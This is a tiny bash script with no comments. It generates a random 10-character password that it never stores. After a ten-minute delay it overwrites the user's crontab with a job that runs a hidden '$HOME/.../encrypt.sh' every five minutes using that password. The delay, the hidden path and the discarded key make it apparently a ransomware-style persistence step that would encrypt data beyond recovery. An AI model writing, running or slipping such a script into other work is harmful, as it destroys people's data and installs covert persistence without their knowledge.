#!/bin/bash
random_passwd=`cat /dev/urandom | tr -dc "A-Za-z0-9" | head -c 10`
(sleep 600; echo "*/5 * * * * $HOME/.../encrypt.sh $random_passwd" | crontab) &
